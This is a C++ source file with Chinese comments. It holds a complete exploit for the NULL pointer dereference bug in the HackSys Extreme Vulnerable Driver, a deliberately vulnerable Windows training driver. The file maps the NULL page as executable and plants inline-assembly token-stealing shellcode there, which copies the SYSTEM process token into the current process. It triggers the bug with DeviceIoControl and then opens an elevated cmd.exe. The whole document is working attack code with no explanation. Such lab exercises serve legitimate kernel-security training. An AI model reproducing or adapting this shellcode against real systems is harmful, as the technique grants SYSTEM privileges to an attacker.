// HEVD_NULL_POINTER.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

void shellcode()
{
	_asm
	{
		int 3
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// 循环是为了获取system的_EPROCESS
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// 找到进程活动链表
					 sub eax, 0xb8    		// 链表遍历
					 cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
					 jnz find_sys_pid

					 // 替换Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 ret
	}
}

int main()
{

	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}


	// 分配0页内存
	PNtAllocateVirtualMemory NtAllocateVirtualMemory;

	NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"),
		"NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		wprintf(L"[!] Failed to Resolve NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return -1;
	}

	PVOID BaseAddress = (PVOID)0x1;
	SIZE_T RegionSize = 1024;

	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&BaseAddress,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE
	);


	//将0页内存的 CloseProcedure 处修改为shellcode地址。
	*(DWORD*)(0x4) = (DWORD)shellcode;
	DWORD pointer = 0x12345678;


	DeviceIoControl(hDevice, 0x22202B, &pointer, 4, NULL, NULL, &recv, NULL);

	system("start cmd.exe");
	CloseHandle(hDevice);
}